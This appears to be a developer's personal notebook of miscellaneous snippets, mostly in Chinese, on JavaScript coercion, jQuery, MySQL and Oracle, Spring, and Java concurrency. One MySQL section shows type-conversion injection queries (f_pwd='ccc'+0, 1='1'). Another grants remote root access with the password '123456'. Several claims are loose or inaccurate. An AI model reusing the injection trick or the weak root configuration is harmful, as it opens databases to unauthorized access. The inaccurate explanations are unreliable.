--------------------------------------------------------------------------------------
function foo2(a){

 return a + '010';

}


foo2(010); -->8010

var foo = "11"+2-"1";  111 number

--------------------------------------------------------------------------------------
function escapeHtml(str) {
return str.replace(/[<>"&]/g, function(match) {
    switch (match) {
                   case "<":
                      return "&lt;";
                   case ">":
                      return "&gt;";
                   case "&":
                      return "&amp;";
                   case "\"":
                      return "&quot;";
      }
  });
}
--------------------------------------------------------------------------------------
oracle
begin
update account set AccountName = '修改-a' where AccountID = '5';
IF SQL%NOTFOUND THEN
  insert into account(AccountID,AccountName) values('5','添加-b');
END IF;
end;
--------------------------------------------------------------------------------------
$.extend(object) 可以理解为JQuery 添加一个静态方法
$.fn.extend(object) 可以理解为JQuery实例添加一个方法

$.extend({ fun1: function () { alert("执行方法一"); } });
$.fun1();
/*  $.fn.extend 定义与调用
* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
$.fn.extend({ fun2: function () { alert("执行方法2"); } });
$(this).fun2();
//等同于
$.fn.fun3 = function () { alert("执行方法三"); }
$(this).fun3();
--------------------------------------------------------------------------------------
jQuery(function () { }); 是某个DOM元素加载完毕后执行方法里的代码
//相当于
$(document).ready(function () { });

(function ($) { })(jQuery); 定义了一个匿名函数 起到了定义插件的私有域的作用
//相当于
var fn = function ($) { };
fn(jQuery);

--------------------------------------------------------------------------------------
(function ($) {
    //step03-a 插件的默认值属性
    var defaults = {
        prevId: 'prevBtn',
        prevText: 'Previous',
        nextId: 'nextBtn',
        nextText: 'Next'
        //……
    };
    //step02 插件的扩展方法名称
    $.fn.easySlider = function (options) {
        //step03-b 合并用户自定义属性，默认属性 表示 options 去覆盖了defaults的值，并把值赋给了options
        var options = $.extend(defaults, options);
    }
})(jQuery);
--------------------------------------------------------------------------------------
$.when($.ajax({
  url: url1,
  ...
}), $.ajax({
  url: url2,
  ...
})).done(function (data1, data2) {...}).fail(function () {...})

done 所有延迟对象都执行成功（resolved）时执行；
fail 有一个延迟对象失败（rejected）时即执行，即使还有未完成的延迟对象；
then 所有延迟对象完成后执行，可以传入两个回调函数作为参数，第一个参数在全部延迟对象成功时执行，第二个参数在有一个或多个延迟对象失败时执行


回调计数
var cnt = 0;
function async1(){
    //do sth...
    callback();
}
function async2(){
    //do sth...
    callback();
}
function callback(){
    cnt++;
    if(2==cnt) console.log('都已执行完毕');
}

循环阻塞
var cnt = 0;
function async1(){
    //do sth...
    cnt++;
}
function async2(){
    //do sth...
    cnt++;
}
while(2>cnt){}

var d1 = $.Deferred();
var d2 = $.Deferred();

function async1(){
    d1.resolve( "Fish" );
}

function async2(){
    d2.resolve( "Pizza" );
}

$.when( d1, d2 ).done(function ( v1, v2 ) {
    console.log( v1 + v2 + '已完成');
});
--------------------------------------------------------------------------------------
<bean class="org.mybatis.spring.mapper.MapperScannerConfigurer">
   <property name="basePackage" value="com.xxxx.dal.mapper" />
   <property name="sqlSessionFactoryBeanName" value="ysSqlSessionFactory" />
 <!-- <property name="sqlSessionFactory" ref="ysSqlSessionFactory"></property> -->
 </bean>
--------------------------------------------------------------------------------------
如何让线程主动放弃持有的锁
Object.wait();
condition.await();
Thread.stop();
reentrantLock.unlock();
semaphore.release();

不会释放锁
Thread.sleep();
Thread.yield();
Thread.currentThread().suspend();
LockSupport.park();
--------------------------------------------------------------------------------------
pfx是带有私钥的证书（包含公钥和私钥）
cer二进制编码的证书（只包含公钥）
Base64编码的证书（只包含公钥）
--------------------------------------------------------------------------------------
截取省份
select substring_index(name,'省',1) from test;
--------------------------------------------------------------------------------------
visibility:hidden与display:none
前者不脱离文档流，保留隐藏之前元素占据的物理区域；而后者则脱离文档流
，如果重新显示则需要页面的重新绘制
如果父级设置display:none;子级设置display:block也不会显示；
而如果父级设置visibility:hidden;子级设置visibility:visible时子级会显示出来
--------------------------------------------------------------------------------------
function foo(){
    console.log(this.a);
}
function doFoo(fn){
    fn();
}
function doFoo2(o){
    o.foo();
}
var obj = {
    a: 2,
    foo: foo
};
var a = "1";
doFoo(obj.foo); 1 doFoo函数，执行环境为全局
doFoo2(obj); 2
--------------------------------------------------------------------------------------
function foo(somthing){
    console.log(this.a, somthing);
}
function bind(fn, obj){
    return function(){
        return fn.apply(obj, arguments);
    }
}
var obj = {
    a:2
}
var bar = bind(foo, obj);
var b = bar(3);
console.log(b); 2 3 undefined
函数没有返回值的情况下默认返回undefined

--------------------------------------------------------------------------------------
function foo(a,b){
    this.val = a+b;
	console.log('--->a='+a);
	console.log('--->b='+b);
}
var bar = foo.bind(null, 'p1');
var baz = new bar('p3');
console.log(baz.val);  p1p3

bind函数的第一个参数为null代表作用域不变，
后面的不定参数将会和函数本身的参数按次序进行绑定，
绑定之后执行函数只能从未绑定的参数开始传值

--------------------------------------------------------------------------------------
var a = 'foo';

a[1] = 'O';

console.log(0.1+0.2==0.3||a);--> foo
--------------------------------------------------------------------------------------
js中的基本数据类型Functoin/Object/Number/Array/boolean都是函数（用typeof 可以查看)

--------------------------------------------------------------------------------------
var v='Hello World';

(function(){

console.log(v);
  --->undefined
var v='I love you';

})();

--------------------------------------------------------------------------------------
js中有函数作用域但是没有块级作用域
var x = 1;
console.log(x); // 1
if (true) {
    var x = 2;
    console.log(x); //2
}
console.log(x);// 2
--------------------------------------------------------------------------------------
获取所有dom的方法
document.getElementsByTagName( '*' )
--------------------------------------------------------------------------------------
chrome
ctrl+o
按文件名全量搜索文件

ctrl+shift+o
在当前打开的js文件中搜索函数名称

在 Chrome 浏览器的 Elements 里面选中某个元素，按 h 可以隐藏该元素
--------------------------------------------------------------------------------------
atob() 函数能够解码通过base-64编码的字符串数据
btoa() 函数能够从二进制数据“字符串”创建一个base-64编码的ASCII字符串

编码非ascii
function b64EncodeUnicode(str) {
    return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
        return String.fromCharCode('0x' + p1);
    }));
}

编码
window.btoa(encodeURIComponent('中文')) 没啥用
解码
decodeURIComponent(window.atob('JUU0JUI4JUFEJUU2JTk2JTg3'))

--------------------------------------------------------------------------------------
jQuery.validator.addMethod("noCn", function(value) {
    return !(/[^\x00-\xff]/.test(value));
}, jQuery.format("不能输入中文"));
--------------------------------------------------------------------------------------
jdbcType=VARCHAR
--------------------------------------------------------------------------------------
避免特别大的事务
只需要反复更新一条记录，而不提交，就会产生大量undo日志 undo日志不能被回收，从而使得磁盘空间被耗尽

定义大量的变量 导致MySQL占用的内存急剧上涨，最后被操作系统kill掉

mysql 5.6 grant授权时，如果使用了一个很长的数据库名，将导致MySQL挂掉

--------------------------------------------------------------------------------------
0不限制
select user,max_user_connections from mysql.user where user='root';

mysql限制资源
grant all on *.* to 'test'@'localhost'
with max_queries_per_hour 100
max_updates_per_hour 10
max_connections_per_hour 20
max_user_connections 5;

查看当前用户（自己）权限：
show grants;
show grants for current_user();

update user u set u.host = '%' where u.user = 'root'
alter user 'root'@'%' identified by '123456';

查看插件
show plugins;

binlog，redolog，undolog，这些都是顺序IO写
聚集索引表 owner_id    friend_id（好友id）

select null<=>null -->1 安全等于
select 1<=>null  -->0

select null<>null  -->null 不等于

mysql隐式转换的规则 ：
两个参数至少有一个是 NULL 时，比较的结果也是 NULL，例外是使用 <=> 对两个 NULL 做比较时会返回 1，这两种情况都不需要做类型转换
两个参数都是字符串，会按照字符串来比较，不做类型转换
两个参数都是整数，按照整数来比较，不做类型转换
十六进制的值和非数字做比较时，会被当做二进制串
有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为 timestamp
有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，
如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较
所有其他情况下，两个参数都会被转换为浮点数再进行比较

11 + 'aa'-->11
11 + '0.01a' = 11.01

select '11a' = 11, -->1
       '11.0' = 11, -->1
       '11.0' = '11',-->0
        null = 1;  -->null

select 'a'+'b' -->0

类型转换注入
select * from test_account  where fname='a'+'b'
select * from test_account  where f_pwd='ccc'+0;
select * from test_account  where 1='1'

show warnings;
select @@warning_count;
错误显示数目,默认64
show variables like 'max_error_count';
打开警告开关
show variables like 'sql_notes';

char最大长度为255，存入不够255个字符时，右边补充spaces填充
varchar最大长度为65535
varchar(n)比char(n)多一个或两个字节，用来确定varchar value的长度
当value不超过255个字符，额外的一个字节即可value超过255个字符时，需要2个字节

char，还是varchar在compact row-format格式下，NULL都不占用任何存储空间
--------------------------------------------------------------------------------------
延迟加载你的bean
常见的方式是在配置文件中在<beans>上加：default-lazy-init="true"
--------------------------------------------------------------------------------------
${poduct['${priceType}']}
--------------------------------------------------------------------------------------
ie8
setTimeout(function(){getinfo()},400);
--------------------------------------------------------------------------------------
启动tomcat后启动两个spring容器：
    1、spring通过web.xml来启动的（父）
    2、springMVC来启动的（子）

关系与限制：
    1、子容器能访问父容器的资源（bean）
    2、父容器不能访问子容器的资源
--------------------------------------------------------------------------------------
console.log(5*"5"); 25
console.log(5*"a"); NaN
console.log(5*NaN); NaN
console.log(5*null); 0
console.log(5*undefined); NaN

如果Infinity与0相乘，结果是NaN
Infinity*0  NaN

Number()函数，将其进行转化
--------------------------------------------------------------------------------------
console.log(5/"5"); 1
console.log(5/"a"); NaN
console.log(5/NaN); NaN
console.log(5/null); Infinity
console.log(null/5); 0
console.log(5/undefined); NaN
console.log(5/5);  1
console.log(5/0);  Infinity
console.log(0/5);  0
console.log(0/0); NaN

Number(null)==0
--------------------------------------------------------------------------------------
console.log(16%"5"); 1
console.log(5%"a"); NaN
console.log(5%NaN); NaN
console.log(5%null); NaN  -->5%0
console.log(null%5); 0
console.log(5%undefined); NaN
console.log(5%5); 0
console.log(5%0); NaN
console.log(0%5);  0
console.log(0%0); NaN

Infinity%Infinity  -->NaN

--------------------------------------------------------------------------------------
console.log(16+"5");  165
console.log(5+"a");  5a
console.log(5+NaN);  NaN
console.log(5+null);  5
console.log(5+undefined); NaN
console.log(5+5);  10
console.log("两个数的和是"+5+5);  55
console.log("两个数的和是"+(5+5)); 10

加法运算只要其中一个是字符串，那么另外一个也会转换为字符串，然后进行字符串的拼接
--------------------------------------------------------------------------------------
console.log(16-"5");  11
console.log(5-"a");  NaN
console.log(5-NaN);  NaN
console.log(5-null);  5
console.log(5-undefined);  NaN
console.log(5-5);  0
console.log(5-true);  4
console.log(5-"true"); NaN --->
console.log(5-"");  5
console.log("两个数的差是"+5-5); NaN
console.log("两个数的差是"+(5-5)); 0

Infinity-Infinity结果是NaN
-Infinity-Infinity结果是-Infinity
一个数字减Infinity结果是-Infinity
Infinity-（-Infinity）结果是Infinity
--------------------------------------------------------------------------------------
console.log(16>"5");  true
console.log("16">"5"); false
console.log(5<"a"); false
console.log(5>=NaN); false
console.log(5<NaN); false
console.log(NaN>=NaN); false
console.log(5>=null);  true
console.log(5>=undefined); false
console.log(5>=5); true
console.log(5>=true); true
console.log(5>="true"); false
console.log(5>="");  true
console.log("Brick">"alphabet"); false
console.log("brick">"alphabet"); true
--------------------------------------------------------------------------------------
console.log(0.6|0)//0
console.log(1.1|0)//1
console.log(3.65555|0)//3
console.log(5.99999|0)//5
console.log(-7.777|0)//-7

3|4
转换为二进制之后011|100  相加得到111=7

4|4
转换为二进制之后100 |100  相加得到100=4

8|3
转换为二进制之后1000 |011  相加得到1011=11
--------------------------------------------------------------------------------------
var haorooms=[];
console.log(haorooms instanceof Array) //返回true
console.log([].constructor == Array);
--------------------------------------------------------------------------------------
JavaScript中函数也是对象
function Person(name) {
    this.name = name;
};
Person.prototype = {
    getName: function() {
        return this.name;
    }
};
var p = new Person("haorooms");
console.log(p.constructor === Person);  // false
console.log(Person.prototype.constructor === Person); // false
console.log(p.constructor.prototype.constructor === Person); // false

function Person(name) {
     this.name = name;
 };
Person.prototype = {
     getName: function() {
         return this.name;
     }
};
Person.prototype.constructor = Person;


function Person(name) {
    this.name = name;
};
Person.prototype = {
  constructor:Person,//指定constructor
    getName: function() {
        return this.name;
    }
};
var p = new Person("haorooms");
console.log(p.constructor === Person);  // true
console.log(Person.prototype.constructor === Person); // true
console.log(p.constructor.prototype.constructor === Person); // true
--------------------------------------------------------------------------------------
不规范的属性 可点击的元素时，覆盖显示的高亮颜色 当透明度设为0，则会禁用此属性
.no{
    -webkit-tap-highlight-color:rgba(0,0,0,0);
}
--------------------------------------------------------------------------------------
//中文转unicode
function unicode(value){
    var preStr='\\u';
    var cnReg=/[\u0391-\uFFE5]/gm;
    if(cnReg.test(value)){
        var ret=value.replace(cnReg,function(str){
            return preStr+str.charCodeAt(0).toString(16)
        });
        return ret
    }else{
       console.log('没有找到中文字符串')
    }
}
--------------------------------------------------------------------------------------
$("input[id^='haorooms']")  以开头
$("div").data("role") === "page";

特殊转义
#('#Div\\.1")
$('#id\\\\.a');  -->id.a
var id4 = $("#test\\[2\\]");
--------------------------------------------------------------------------------------
/i (忽略大小写)
/g (全文查找出现的所有匹配字符)
/m (多行查找)
/gi(全文查找、忽略大小写)
/ig(全文查找、忽略大小写)
--------------------------------------------------------------------------------------
替换变化的正则
var html='<p class="Hrooms-infor"><span title="haorooms">haorooms</span><span title="行：haorooms">haorooms</span></p>'
var regExp = new RegExp(">(haorooms)<", 'gi');
var newHtml = html.replace(regExp,'><em class="highlight">$1</em><');
--------------------------------------------------------------------------------------
反压通常产生于这样的场景：短时负载高峰导致系统接收数据的速率远高于它处理数据的速率
例如，垃圾回收停顿可能会导致流入的数据快速堆积，或者遇到大促或秒杀活动导致流量陡增
--------------------------------------------------------------------------------------
$.each:该方法用于遍历任何集合，包括数组和对象
$(selector).each:该方法用于遍历Jquery对象

var arry = ["a","b","c","d",…];
$.each(arry,function(index,value){…})
回调函数中：index 代表数组的索引 ，value 代表数组中的值

$().each回调函数中的this不是Jquery对象 而是Dom对象
--------------------------------------------------------------------------------------
<context:property-placeholder location="classpath:properties/mongodb.properties" ignore-unresolvable="true"/>
--------------------------------------------------------------------------------------
alter table t_user_2 auto_increment=70
--------------------------------------------------------------------------------------
不能判别原始类型值
'a' instanceof String 返回结果：false
--------------------------------------------------------------------------------------
用异步缩短住业务流程 +用批量提高执行效率+数据库读写分离分散读写压力

合理利用索引+降低扫描频率+扫描适量记录
只在队列长度低于某个下限值时才扫描

无界队列 一旦生产线程快于消费线程，队列将快速变长
从线程池到无界队列到无界队列中的元素全是强引用，GC无法释放

--------------------------------------------------------------------------------------
上下文切换又分为2种：让步式上下文切换和抢占式上下文切换
前者是指执行线程主动释放CPU，与锁竞争严重程度成正比，可通过减少锁竞争来避免；
后者是指线程因分配的时间片用尽而被迫放弃CPU或者被其他优先级更高的线程所抢占，
一般由于线程数大于CPU可用核心数引起，适当减少线程数来避免

高并发，低耗时的情况：建议少线程
低并发，高耗时的情况：建议多线程，保证有空闲线程，接受新的任务
高并发高耗时：1要分析任务类型，2增加排队，3、加大线程数

--------------------------------------------------------------------------------------
java 8
 -parameters compiler option 获取参数名称
--------------------------------------------------------------------------------------
var regex_num_set = /&#(\d+);/g;
var str = "Here is some text: &#27599;&#26085;&#19968;&#33394;|&#34013;&#30333;~"

str = str.replace(regex_num_set, function(_, $1) {
  return String.fromCharCode($1);
});

StringEscapeUtils.unescapeHtml4
--------------------------------------------------------------------------------------
jsonp的缺点
没有关于 JSONP 调用的错误处理(不能从服务器捕捉到 404 错误，也不能取消或重新开始请求)

--------------------------------------------------------------------------------------
function aa()
{
    console.log("aaa");
    return function(){console.log("bbb");};
}

console.log(aa); 函数aa
console.log(aa()); aa 函数
console.log(aa()()); aa bb
--------------------------------------------------------------------------------------
$('.a').eq(1) // 选择了第二个a，是jq对象
$('.a')[1]  // 选择了第二个a，是dom对象

--------------------------------------------------------------------------------------
function t3(x,y) {
    var x = 7;
    console.log('x='+x);   7
    console.log('y='+y);   undefined
}
t3(5); -->(x,undefined)

--------------------------------------------------------------------------------------
var str1 = 'global';
function t4() {
    console.log('str1='+str1);  global
    console.log('str2='+str2);  undefined 变量提升
    var str2 = 'local';
    console.log('str2='+str2);  local
}
t4();
--------------------------------------------------------------------------------------
function t(x,y) {
    function x() {
        console.log('hello');
    }

    var y = 99;
    console.log('x='+x);   --函数
    console.log('y='+y);  ---99

}
t(3,4);
--------------------------------------------------------------------------------------
function t1(x) {
    console.log('x='+x);  x函数
    function x() {
        var x = 9;
        console.log('x2='+x);  9
    }
    x();
}
t1(1);
--------------------------------------------------------------------------------------
var a=function(){}发生在运行期的 函数表达式
function a（）{} 发生在词法分析期 函数声明式
--------------------------------------------------------------------------------------
首字母大写
function titleCase(str) {
    var convertToArray = str.toLowerCase().split(" ");
    var result = convertToArray.map(function(val){
        return val.replace(val.charAt(0), val.charAt(0).toUpperCase());
    });
    return result.join(" ");
}
titleCase("hello world");

--------------------------------------------------------------------------------------
使用!!操作符转换布尔值
只要变量的值为:0、null、" "、undefined或者NaN都将返回的是false，反之返回的是true

this.age = age || 27;默认值
--------------------------------------------------------------------------------------
局部事件就是在每次的Ajax请求时在方法内定义
$.ajax({
    type: "POST",
    url: root + "/xxx,
    data: requestData,
    dataType: "json",
   global:false, --全局
    success: function(data){
         // 清空列表

    }
 });

全局事件是每次的Ajax请求都会触发的，它会向DOM中的所有元素广播
$("#loading").bind("ajaxSend", function() {
   });

--------------------------------------------------------------------------------------
synchronized在代码执行时出现异常，JVM会自动释放锁定
ReentrantLock是通过自己写代码实现加锁和释放的，要保证锁定一定会被释放，就必须将unLock()放到finally{}中


--------------------------------------------------------------------------------------
if (booleanTask.isDone() && !booleanTask.isCancelled())
--------------------------------------------------------------------------------------
Future只实现了异步，而没有实现回调，主线程get时会阻塞，可以轮询以便获取异步调用是否完成
不能防止任务的重复提交
--------------------------------------------------------------------------------------
FutureTask是Future接口的一个唯一实现类
FutureTask 是基本的实现了Future和runnable接口
--------------------------------------------------------------------------------------
FutureTask可用于异步获取执行结果或取消执行任务的场景
可以确保即使调用了多次run方法，它都只会执行一次Runnable
--------------------------------------------------------------------------------------
Future是一个接口，代表可以取消的任务，并可以获得任务的执行结果
如果在指定的时间内没有获取到结果（任务还为完成），则抛出timeout exception
在任务执行完成后，可以多次调用取回相同的结果

--------------------------------------------------------------------------------------
<result column="XXDATE" jdbcType="TIMESTAMP" property="xxdate"/>
--------------------------------------------------------------------------------------
隐藏Tomcat版本信息
首先找到这个jar包，$TOMCAT_HOME/lib/catalina.jar
依次路径\org\apache\catalina\util\ServerInfo.properties

--------------------------------------------------------------------------------------
Timestamp stamp=new Timestamp(new Date().getTime());
boolean isInstance=(stamp instanceof java.util.Date); --true
--------------------------------------------------------------------------------------
http://note.youdao.com/share/?id=1c415390062f568bc48964473f0435eb&type=note#/
http://note.youdao.com/share/?id=1851419c5d80cdae7988a717e38d3b28&type=note#/
--------------------------------------------------------------------------------------
修改/opt/jetty9/etc/jetty.xml配置文件，在Configure中添加如下
<Call name="setAttribute">
     <Arg>org.eclipse.jetty.server.Request.maxFormContentSize</Arg>
     <Arg>500000</Arg>
</Call>
--------------------------------------------------------------------------------------
一般情况，把除去get或者is（如果是boolean类型）后的部分首字母转成小写即可，比如：getFoo –> foo
如果除去get和is后端的部分，首字母和第二个字母都是大写，不作转换即可，比如：getXPath –> XPath
--------------------------------------------------------------------------------------
在线查看
URL u = new URL("file:///" + filePath);
String contentType = u.openConnection().getContentType();
response.setContentType(contentType);
response.setHeader("Content-Disposition", "inline;filename="
         + fname);
--------------------------------------------------------------------------------------
var factorial = (function f(num) {
    if (num <= 1) {
        return 1;
    } else {
        return num * f(num -1);
    }
});
--------------------------------------------------------------------------------------
serialVersionUID作用：
       序列化时为了保持版本的兼容性，即在版本升级时反序列化仍保持对象的唯一性
有两种生成方式：
       一个是默认的1L，比如：private static final long serialVersionUID = 1L;
       一个是根据类名、接口名、成员方法及属性等来生成一个64位的哈希字段


--------------------------------------------------------------------------------------
oracle时间戳
select to_number(sysdate -
       to_date('1970-01-01 8:0:0', 'YYYY-MM-DD HH24:MI:SS')) * 24 * 60 * 60 * 1000
from dual;

select to_char(1112070645000 / (1000 * 60 * 60 * 24) +
       to_date('1970-01-01 08:00:00', 'YYYY-MM-DD HH:MI:SS'), 'YYYY-MM-DD HH:MI:SS') as cdate
from dual;


mysql
select unix_timestamp(current_timestamp()),
       from_unixtime(unix_timestamp(current_timestamp()))
--------------------------------------------------------------------------------------
String类的hashCode()方法使用的是Time31算法
对字符串逐字符迭代乘以31
--------------------------------------------------------------------------------------
select count(distinct col) from A;  内存消耗可能较大
select count(1) from (select 1 from A group by col) alias; 排序，执行时间会较长

两个极端：
1.数据列的所有数据都一样，即去重计数的结果为1时，用distinct最佳
2.如果数据列唯一，没有相同数值，用group 最好
--------------------------------------------------------------------------------------
https://github.com/eXparity/hamcrest-date
--------------------------------------------------------------------------------------
在Slave上使用 replicate_wild_do_table 和 replicate_wild_ignore_table 来解决跨库更新的问题，如：
replicate_wild_do_table=test.%
replicate_wild_ignore_table=mysql.%


只同步bbp库的t_csp表
replicate_do_table=bbp.t_csp

同步多个表
replicate_do_table=bbp.t_csp
replicate_do_table=lmis.md_goods_type

同步数据库名以bbp开始和表名以t开始的数据
replicate_wild_do_table=bbp%.t%

master
#需要同步的二进制数据库名；
binlog-do-db=wuxi
#不同步的二进制数据库名;这个同步后听说很麻烦，我没有同步；
binlog-ignore-db=mysql
#跳过错误，继续执行复制；
slave-skip-errors
--------------------------------------------------------------------------------------
行溢出off-page
字段是a varchar(30000) , innoDB的页才16384个字节

溢出的数据不再存储在B+tree中
溢出的数据使用的是uncompress BLOB page，并且存储独享,这就是存储越来越大的真正原因

只要一行记录的总和超过8k，就会溢出

如果有多个大字段，尽量序列化后，存储在同一列中,避免多次off-page
将text等大字段从主表中拆分出来，a）存储到key-value中 b）存储在单独的一张子表中，并且压缩
必须保证一行记录小于8k

--------------------------------------------------------------------------------------
导致auto_increment变小
alter table xx auto_increment = yy;
truncate table
restart mysql

--------------------------------------------------------------------------------------
mysql 5.6 -->Mysql5.7 已经默认为200
eq_range_index_dive_limit
在较多等值查询（例如多值的IN查询）情景中，预估可能会扫描的记录数，
从而选择相对更合适的索引，避免所谓的index dive问题

eq_range_index_dive_limit = 0 只能使用index dive 统计速度慢但是能得到精准的值
0 < eq_range_index_dive_limit <= N 使用index statistics 统计速度快但是数据未必精准
eq_range_index_dive_limit > N 只能使用index dive

--------------------------------------------------------------------------------------
Handle的相关统计
show status like 'Han%';
--------------------------------------------------------------------------------------
查看优化记录
set optimizer_trace="enabled=on";
select trace
from information_schema.optimizer_trace outfile 'trace.json'

--------------------------------------------------------------------------------------
Mysql5.6 以及更高版本以及去掉了只能拥有一个CURRENT_TIMESTAMP default值限制
--------------------------------------------------------------------------------------
关闭timestamp 的默认行为警告
show variables like 'explicit_defaults_for_timestamp';
显示指定默认值为timestamp类型的字段

=1
此时如果TIMESTAMP列没有显示的指定not null属性，那么默认的该列可以为null，此时向该列中插入null值时，会直接记录null，而不是current timestamp
如果TIMESTAMP列被加上了not null属性，并且没有指定默认值 向该列中插入'0000-00-00 00:00:00'并且产生一个warning


在默认情况下，如果TIMESTAMP列没有显示的指明null属性，那么该列会被自动加上not null属性
如果往这个列中插入null值，会自动的设置该列的值为current timestamp值
表中的第一个TIMESTAMP列，如果没有指定null属性或者没有指定默认值，
也没有指定ON UPDATE语句那么该列会自动被加上DEFAULT CURRENT_TIMESTAMP和ON UPDATE CURRENT_TIMESTAMP属性
一个TIMESTAMP列之后的其他的TIMESTAMP类型的列，如果没有指定null属性，也没有指定默认值，那么该列会被自动加上DEFAULT '0000-00-00 00:00:00'属性

--------------------------------------------------------------------------------------
select @@global.sql_mode

strict_trans_tables严格模式
--------------------------------------------------------------------------------------
System.setProperty("http.keepAlive","false");

http.keepAlive为真
usingproxy?60:5
java.net.URLConnection是请求间隔小于等于5秒，则不会新建TCP连接

disconnect关闭连接

HTTP协议采用“请求-应答”模式
Keep-Alive模式(又称持久连接、连接重用)
Keep-Alive功能使客户端到服 务器端的连接持续有效，当出现对服务器的后继请求时，
Keep-Alive功能避免了建立或者重新建立连接

http 1.0中默认是关闭的，需要在http头加入"Connection: Keep-Alive"，才能启用Keep-Alive；
http 1.1中默认启用Keep-Alive，如果加入"Connection: close "，才关闭

Keep-Alive判断消息内容/长度的大小
使用消息首部字段Conent-Length 静态
使用消息首部字段Transfer-Encoding 动态
Transfer-Encoding：chunk模式来传输数据

chunk编码将数据分成一块一块的发生Chunked编码将使用若干个Chunk串连而成，
由一个标明长度为0 的chunk标示结束每个Chunk分为头部和正文两部分
头部内容指定正文的字符总数（十六进制的数字 ）和数量单位（一般不写），
正文部分就是指定长度的实际内容，两部分之间用回车换行(CRLF) 隔开

--------------------------------------------------------------------------------------
show global status like 'innodb_buffer_pool_pages_%';
Innodb_buffer_pool_pages_free 为 0，则说明 buffer pool 已经被用光，需要增大 innodb_buffer_pool_size
--------------------------------------------------------------------------------------
start transaction;

commit;
--------------------------------------------------------------------------------------
start transaction;
select * from t where id='x'; // 获取数据
if exist:
 update t set c=c+1 where id='x'; //如果存在可以直接更新
 return;
rows=insert ignore into t(id,c) values('x',1); // insert ignore,如果不存在则返回1表示插入成功，如果已存在会返回0
if rows==1:
  return; // 插入了当前不存在的行，可以返回
else rows==0:  // 表示插入时数据库已经存在了id='x'的行
  update set d='xxx' where id='x'; // 更新一个不太重新的列，例如时间，获取锁，因为update之后再select可以获取到最新的行并且锁住记录
  select * from t where id='x'; // 此时获取到的就是最新的行，并且其他update都被锁住
  nc=c; // 程序拿到的c就是当前最新的c
  nc+=1; //在应用程序中重新计算
  update t set c=nc where id='x'; // 最后更新回去
commit;
--------------------------------------------------------------------------------------
http://note.youdao.com/share/?id=02105f75d054c8486c40d1546e7ad764&type=note#/  pgp加密
--------------------------------------------------------------------------------------
HaProxy可以通过监听一个统一的端口对外提供能力，然后内部进行分发除支持http7层处理外，还顺便为mysql支持4层转发

haproxy请求分发
keepAlived高可用
--------------------------------------------------------------------------------------
https://github.com/holtenko/CodingInterviews
https://github.com/greghaskins/spectrum
https://github.com/graphaware/neo4j-timetree
--------------------------------------------------------------------------------------
escape()函数 大于255转换成%uxxxx的格式
unescape 不会被此方法编码的字符： @*/+

encodeURI()把URI字符串采用UTF-8编码格式转化成escape格式的字符串
不会被此方法编码的字符：! @ # $& * ( ) = : / ; ? + '

--------------------------------------------------------------------------------------
mysql反引号 `
--------------------------------------------------------------------------------------
var dateTime = new Date("2016/05/20 23:42:00");
var dateTime = new Date();
所有浏览器都兼容
--------------------------------------------------------------------------------------
ls | xargs -n 10 rm -rf
解释： 每10个文件一次的删除

xargs
-p参数会提示让你确认是否执行后面的命令,y执行，n不执行
--------------------------------------------------------------------------------------
find . -name \* -type f -print \转义
--------------------------------------------------------------------------------------
单独下拉框设置默认值：$("#J_province").find("option[value='3']").attr({"selected": "selected"}).end().selectOrDie({size: 8});

级联下拉框设置默认值：
参考纸质工单质检：
$('.cityTypeFindTag').html('').append('<select id="J_city" name="addr_code"></select>');
$('#J_city').temp($("#city_tpl").val(), json);
$("#J_city").find("option[value='1']").attr({"selected": "selected"}).end()
$('#J_city').selectOrDie({size: 8});
--------------------------------------------------------------------------------------
TransactionAspectSupport.currentTransactionStatus().setRollbackOnly();
--------------------------------------------------------------------------------------
RequestMappingHandlerAdapter adapter = new RequestMappingHandlerAdapter();
--------------------------------------------------------------------------------------
偏向锁
如果程序没有竞争，则取消之前已经取得锁的线程同步操作
若某一锁被线程获取后，便进入偏向模式，当线程再次请求这个锁时，就无需再进行相关的同步操作
 public static List<Integer> numberList = new Vector<Integer>(); 线程安全
-XX:-UseBiastedLocking参数禁用偏向锁

在单个线程中操作一个对象的同步方法，是有一定的优势

轻量级锁
重量级锁
自旋锁
自旋锁可以使线程在没有取得锁的时候，不被挂起，而转去执行一个空循环，
若在若干个空循环后，线程如果可以获得锁，则继续执行若线程依然不能获得锁，才会被挂起

--------------------------------------------------------------------------------------
GC根对象包括：
当前执行方法中的所有本地变量及入参
活跃线程
已加载类中的静态变量
JNI引用

标记-清除
标记-整理 Gc暂停时间长
复制 额外空间
--------------------------------------------------------------------------------------
https://github.com/alibaba/transmittable-thread-local
--------------------------------------------------------------------------------------
<script type="text/javascript" src="hjsx/ins/Calendar.js" charset="UTF-8"></script>
--------------------------------------------------------------------------------------
mysql boolean -->tinyint(1)
--------------------------------------------------------------------------------------
tomcat实例无法关闭
tomcat的主线程没有结束(也即main函数没有执行结束-->不可能)
tomcat中启动的webapps有非daemon线程阻止了Tomcat进程的关闭

Executors.defaultThreadFactory()
public Thread newThread(Runnable r) {
    Thread t = new Thread(group, r,
                          namePrefix + threadNumber.getAndIncrement(),
                          0);
    if (t.isDaemon())
        t.setDaemon(false);
    if (t.getPriority() != Thread.NORM_PRIORITY)
        t.setPriority(Thread.NORM_PRIORITY);
    return t;
}
线程池submit了任务以后，如果不主动调用线程池的shutdown()函数是无法destroy这些线程的

--------------------------------------------------------------------------------------
Struts 2 的标签库中都是使用OGNL表达式访问ApplicationContext中的对象数据
OGNL主要有三个重要因素
Expression
Expression是整个OGNL的核心内容，所有的OGNL操作都是针对表达式解析后进行的

Root对象

ApplicationContext

MVEL主要使用在Drools
MVEL在执行语言时主要有解释模式（ Interpreted Mode ）和编译模式（ Compiled Mode ）两种：

解释模式（Interpreted Mode）是一个无状态的，动态解释执行，不需要负载表达式就可以执行相应的脚本
编译模式（Compiled Mode）需要在缓存中产生一个完全规范化表达式之后再执行


--------------------------------------------------------------------------------------
show status 查看当前连接的服务器状态
show global status 查看mysql服务器启动以来的状态

查看慢查询次数
show global status like "%slow%"

show global variables like "%slow%";
show global variables like "%long_query%";

slow-query-log = on
slow_query_log_file  =  /home/mysql-run/mysql_slow.log
long_query_time = 10  #慢查询执行时间记录粒度 默认是10秒
